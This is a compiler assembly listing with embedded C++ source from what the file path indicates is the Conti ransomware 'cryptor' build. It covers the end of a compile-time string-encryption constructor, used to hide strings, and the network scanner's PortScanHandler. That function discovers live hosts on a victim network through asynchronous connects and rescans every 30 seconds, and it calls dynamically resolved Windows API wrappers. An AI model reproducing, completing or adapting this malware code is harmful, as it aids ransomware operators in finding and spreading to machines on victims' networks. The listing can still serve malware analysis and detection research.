  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00719	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0071d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv392[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00723	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0072a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00731	5f		 pop	 rdi
  00732	5d		 pop	 rbp
  00733	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?PortScanHandler@@YAKPEAX@Z
_TEXT	SEGMENT
hTimer$ = 8
IsTimerActivated$ = 36
hTimerQueue$ = 72
dwBytesTransferred$7 = 100
CompletionStatus$8 = 136
ConnectContext$9 = 168
Success$10 = 196
ConnectCtx$11 = 232
ConnectCtx$12 = 264
ConnectCtx$13 = 296
__$ArrayPad$ = 504
pArg$ = 544
?PortScanHandler@@YAKPEAX@Z PROC			; PortScanHandler, COMDAT

; 499  : {

$LN40:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 02
	00 00		 sub	 rsp, 584		; 00000248H
  0000e	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00013	48 8d 7c 24 40	 lea	 rdi, QWORD PTR [rsp+64]
  00018	b9 52 00 00 00	 mov	 ecx, 82			; 00000052H
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 68
	02 00 00	 mov	 rcx, QWORD PTR [rsp+616]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 f8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 500  : 	g_ActiveOperations = 0;

  00049	c7 05 00 00 00
	00 00 00 00 00	 mov	 DWORD PTR ?g_ActiveOperations@@3JA, 0 ; g_ActiveOperations

; 501  : 	HANDLE hTimer = NULL;

  00053	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR hTimer$[rbp], 0

; 502  : 	BOOL IsTimerActivated = FALSE;

  0005b	c7 45 24 00 00
	00 00		 mov	 DWORD PTR IsTimerActivated$[rbp], 0

; 503  : 
; 504  : 	HANDLE hTimerQueue = pCreateTimerQueue();

  00062	e8 00 00 00 00	 call	 ?pCreateTimerQueue@@YAPEAXXZ ; pCreateTimerQueue
  00067	48 89 45 48	 mov	 QWORD PTR hTimerQueue$[rbp], rax

; 505  : 	if (!hTimerQueue) {

  0006b	48 83 7d 48 00	 cmp	 QWORD PTR hTimerQueue$[rbp], 0
  00070	75 0a		 jne	 SHORT $LN17@PortScanHa

; 506  : 		pExitThread(EXIT_FAILURE);

  00072	b9 01 00 00 00	 mov	 ecx, 1
  00077	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN17@PortScanHa:
$LN2@PortScanHa:

; 507  : 	}
; 508  : 
; 509  : 	while (TRUE) {

  0007c	33 c0		 xor	 eax, eax
  0007e	83 f8 01	 cmp	 eax, 1
  00081	0f 84 94 03 00
	00		 je	 $LN3@PortScanHa

; 510  : 
; 511  : 		DWORD dwBytesTransferred;
; 512  : 		ULONG_PTR CompletionStatus;
; 513  : 		PCONNECT_CONTEXT ConnectContext;
; 514  : 
; 515  : 		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);

  00087	c7 44 24 20 ff
	ff ff ff	 mov	 DWORD PTR [rsp+32], -1	; ffffffffH
  0008f	4c 8d 8d a8 00
	00 00		 lea	 r9, QWORD PTR ConnectContext$9[rbp]
  00096	4c 8d 85 88 00
	00 00		 lea	 r8, QWORD PTR CompletionStatus$8[rbp]
  0009d	48 8d 55 64	 lea	 rdx, QWORD PTR dwBytesTransferred$7[rbp]
  000a1	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  000a8	e8 00 00 00 00	 call	 ?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z ; pGetQueuedCompletionStatus
  000ad	89 85 c4 00 00
	00		 mov	 DWORD PTR Success$10[rbp], eax

; 516  : 
; 517  : 		if (CompletionStatus == START_COMPLETION_KEY) {

  000b3	48 83 bd 88 00
	00 00 01	 cmp	 QWORD PTR CompletionStatus$8[rbp], 1
  000bb	75 5c		 jne	 SHORT $LN18@PortScanHa

; 518  : 			
; 519  : 			if (!CreateHostTable()) {

  000bd	e8 00 00 00 00	 call	 ?CreateHostTable@@YAHXZ	; CreateHostTable
  000c2	85 c0		 test	 eax, eax
  000c4	75 05		 jne	 SHORT $LN20@PortScanHa

; 520  : 				break;

  000c6	e9 50 03 00 00	 jmp	 $LN3@PortScanHa
$LN20@PortScanHa:

; 521  : 			}
; 522  : 
; 523  : 			ScanHosts();

  000cb	e8 00 00 00 00	 call	 ?ScanHosts@@YAXXZ	; ScanHosts

; 524  : 
; 525  : 			if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {

  000d0	c7 44 24 30 00
	00 00 00	 mov	 DWORD PTR [rsp+48], 0
  000d8	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  000e0	c7 44 24 20 30
	75 00 00	 mov	 DWORD PTR [rsp+32], 30000 ; 00007530H
  000e8	45 33 c9	 xor	 r9d, r9d
  000eb	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  000f2	48 8b 55 48	 mov	 rdx, QWORD PTR hTimerQueue$[rbp]
  000f6	48 8d 4d 08	 lea	 rcx, QWORD PTR hTimer$[rbp]
  000fa	e8 00 00 00 00	 call	 ?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ; pCreateTimerQueueTimer
  000ff	85 c0		 test	 eax, eax
  00101	75 0a		 jne	 SHORT $LN21@PortScanHa

; 526  : 				pExitThread(EXIT_FAILURE);

  00103	b9 01 00 00 00	 mov	 ecx, 1
  00108	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN21@PortScanHa:

; 527  : 			}
; 528  : 
; 529  : 			IsTimerActivated = FALSE;

  0010d	c7 45 24 00 00
	00 00		 mov	 DWORD PTR IsTimerActivated$[rbp], 0
  00114	e9 fd 02 00 00	 jmp	 $LN19@PortScanHa
$LN18@PortScanHa:

; 530  : 
; 531  : 		} else if (CompletionStatus == CONNECT_COMPLETION_KEY) {

  00119	48 83 bd 88 00
	00 00 02	 cmp	 QWORD PTR CompletionStatus$8[rbp], 2
  00121	0f 85 72 01 00
	00		 jne	 $LN22@PortScanHa

; 532  : 
; 533  : 			g_ActiveOperations--;

  00127	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_ActiveOperations@@3JA ; g_ActiveOperations
  0012d	ff c8		 dec	 eax
  0012f	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_ActiveOperations@@3JA, eax ; g_ActiveOperations

; 534  : 
; 535  : 			if (Success && CompleteAsyncConnect(ConnectContext->s)) {

  00135	83 bd c4 00 00
	00 00		 cmp	 DWORD PTR Success$10[rbp], 0
  0013c	74 30		 je	 SHORT $LN24@PortScanHa
  0013e	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR ConnectContext$9[rbp]
  00145	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00149	e8 00 00 00 00	 call	 ?CompleteAsyncConnect@@YAH_K@Z ; CompleteAsyncConnect
  0014e	85 c0		 test	 eax, eax
  00150	74 1c		 je	 SHORT $LN24@PortScanHa

; 536  : 
; 537  : 				ConnectContext->State = CONNECTED;

  00152	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR ConnectContext$9[rbp]
  00159	c6 40 2c 00	 mov	 BYTE PTR [rax+44], 0

; 538  : 				AddHost(ConnectContext->dwAddres);

  0015d	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR ConnectContext$9[rbp]
  00164	8b 48 28	 mov	 ecx, DWORD PTR [rax+40]
  00167	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost

; 539  : 
; 540  : 			} else {

  0016c	eb 0b		 jmp	 SHORT $LN25@PortScanHa
$LN24@PortScanHa:

; 541  : 
; 542  : 				ConnectContext->State = NOT_CONNECTED;

  0016e	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR ConnectContext$9[rbp]
  00175	c6 40 2c 02	 mov	 BYTE PTR [rax+44], 2
$LN25@PortScanHa:

; 543  : 
; 544  : 			}
; 545  : 
; 546  : 			if (!g_ActiveOperations && IsTimerActivated) {

  00179	83 3d 00 00 00
	00 00		 cmp	 DWORD PTR ?g_ActiveOperations@@3JA, 0 ; g_ActiveOperations
  00180	0f 85 0e 01 00
	00		 jne	 $LN26@PortScanHa
  00186	83 7d 24 00	 cmp	 DWORD PTR IsTimerActivated$[rbp], 0
  0018a	0f 84 04 01 00
	00		 je	 $LN26@PortScanHa
$LN4@PortScanHa:

; 547  : 
; 548  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  00190	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A, 0
  00198	0f 84 9f 00 00
	00		 je	 $LN5@PortScanHa

; 549  : 
; 550  : 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);

  0019e	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  001a5	48 89 85 e8 00
	00 00		 mov	 QWORD PTR ConnectCtx$11[rbp], rax

; 551  : 					pshutdown(ConnectCtx->s, SD_SEND);

  001ac	ba 01 00 00 00	 mov	 edx, 1
  001b1	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  001b8	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  001bc	e8 00 00 00 00	 call	 ?pshutdown@@YAH_KH@Z	; pshutdown

; 552  : 					pclosesocket(ConnectCtx->s);

  001c1	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  001c8	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  001cc	e8 00 00 00 00	 call	 ?pclosesocket@@YAH_K@Z	; pclosesocket
$LN8@PortScanHa:

; 553  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  001d1	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  001d8	48 83 78 30 00	 cmp	 QWORD PTR [rax+48], 0
  001dd	74 1c		 je	 SHORT $LN27@PortScanHa
  001df	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  001e6	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  001ea	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$11[rbp]
  001f1	48 8b 49 38	 mov	 rcx, QWORD PTR [rcx+56]
  001f5	48 89 48 38	 mov	 QWORD PTR [rax+56], rcx
  001f9	eb 12		 jmp	 SHORT $LN28@PortScanHa
$LN27@PortScanHa:
  001fb	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  00202	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  00206	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
$LN28@PortScanHa:
  0020d	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$11[rbp]
  00214	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  00218	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$11[rbp]
  0021f	48 8b 49 30	 mov	 rcx, QWORD PTR [rcx+48]
  00223	48 89 08	 mov	 QWORD PTR [rax], rcx
  00226	33 c0		 xor	 eax, eax
  00228	85 c0		 test	 eax, eax
  0022a	75 a5		 jne	 SHORT $LN8@PortScanHa

; 554  : 					pGlobalFree(ConnectCtx);

  0022c	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$11[rbp]
  00233	e8 00 00 00 00	 call	 ?pGlobalFree@@YAPEAXPEAX@Z ; pGlobalFree

; 555  : 
; 556  : 				}

  00238	e9 53 ff ff ff	 jmp	 $LN4@PortScanHa
$LN5@PortScanHa:

; 557  : 
; 558  : 				if (!CreateHostTable()) {

  0023d	e8 00 00 00 00	 call	 ?CreateHostTable@@YAHXZ	; CreateHostTable
  00242	85 c0		 test	 eax, eax
  00244	75 05		 jne	 SHORT $LN29@PortScanHa

; 559  : 					break;

  00246	e9 d0 01 00 00	 jmp	 $LN3@PortScanHa
$LN29@PortScanHa:

; 560  : 				}
; 561  : 
; 562  : 				ScanHosts();

  0024b	e8 00 00 00 00	 call	 ?ScanHosts@@YAXXZ	; ScanHosts

; 563  : 
; 564  : 				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {

  00250	c7 44 24 30 00
	00 00 00	 mov	 DWORD PTR [rsp+48], 0
  00258	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  00260	c7 44 24 20 30
	75 00 00	 mov	 DWORD PTR [rsp+32], 30000 ; 00007530H
  00268	45 33 c9	 xor	 r9d, r9d
  0026b	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  00272	48 8b 55 48	 mov	 rdx, QWORD PTR hTimerQueue$[rbp]
  00276	48 8d 4d 08	 lea	 rcx, QWORD PTR hTimer$[rbp]
  0027a	e8 00 00 00 00	 call	 ?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ; pCreateTimerQueueTimer
  0027f	85 c0		 test	 eax, eax
  00281	75 0a		 jne	 SHORT $LN30@PortScanHa

; 565  : 					pExitThread(EXIT_FAILURE);

  00283	b9 01 00 00 00	 mov	 ecx, 1
